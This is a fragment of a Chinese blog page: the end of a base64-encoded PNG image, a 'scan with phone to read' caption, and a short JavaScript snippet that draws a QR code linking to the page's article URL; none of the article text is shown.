Q/uFe57KQ+4T5txeSK3j3nBDvI2F3QmsgXSn8kZuDATiKtW9wMxZh9AAU+3/XThw/TsUJI6CkkDo+hLhsOznDu0RQvSARPEKCE65A57n3MNY93aWg3n9MRA3WfjeExgD8YTrdsxVtF455512xEG8IZA/OsMxB6G7b8XtPqrmHKIeck3XVYT0dbVbzs9C94HsAZFLP4oxkCPT0l53AmsgrzvrUyuN39Q7N8Q1g0T7YObOaPL4SleE6CfdAcFVn3MIDRJd9yjCcQ+v2aHXguwBkR/5XSesvnVDdCIfFGMgME/1aJ91qhC1EFi1rgeEDxJrjfOu1pw9FSH62SOEW67zd5xqHRA9YMZa67yrM3cPx0DuGT9d/7/sbw3kwyZ5+MfF7RXU3s1BXl9z0h8J1wldB9m34yB1wJYrqs82rsLlH/PA+MuBuYs8fVgTWlTuMAfRz897COGDRPeC5NYN2TvBN/EPDwRimp6uEG65+rlIV1SuyyF6dJo59XGYg6gDTI0bAPnbuEXXC4Gr15pQvAJCg7lH9Sl/JNTb0dU9PJCuyeJ+7gTWQH7uLH+k0/hNHeKKdl19xSpC+IFRAkxfAixCaICp0+h1a4G5isC0PgQHM7ofpGauQ0gfRG4fxDNg6i4C037XDbl7bK81TD/21jfuaCvV59x+iMkDpm5w65fYceIVwPVNgkTxCkjOPSrKsxf2VR2inzUhBFd9zqXvhT0VIXpB/8PCuiH1tKb89cT0PQRygnAuf3bbMPffe9vE13Ugau9xqtsLmHu4H4QG/ZtsnxHSb66i91C5Ll83pDuVN3JrIG88/G7pMRBfqbPYNTNXe3QcxPW2JnSN8m1A+O0R2qPcYQ7CDzPaI9zW7XEQfaTvhXsJOw9ED+kOmLkxkK7J4l5/AtNAIKYGPZ7ZImRt5/cbUjWImo6zH8ID+Y0WZq72eDb3msKjHpDrw21+VFc1yLppINW48tefwBrI68/8cMUfHYiu9zYgryPc5luvnutu9ayonHOIXn6+h+qjgKiDxFoLyUPkqtuGa7a8no80iJ6AbTf4owO56bwedk/gSPiVgQDjb09Hi8Psg+TgNtfbdxReq/Oc0eRxrfJtQO7HGgTnZ+FRD2tCebfxKwPZLrKez5/AGsj5s3qJcxqIrtJRnNlVV1/rrFfOuTWhuQ4hvlRAon2QHERu7R7Cvl97chz1gbkHzFzXYxpIZ1rc605gDARignAOj7YI2cM+v1lCCF25w74O7YGog/xN3ZrwbC1kHzjfC7LOa2ldBcwazJzrKqreMQZSDSt/3wmsgbzv7NuV/wUAAP//Z5S/RQAAAAZJREFUAwCWPO6YPREM9gAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/bigant-Public-download.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 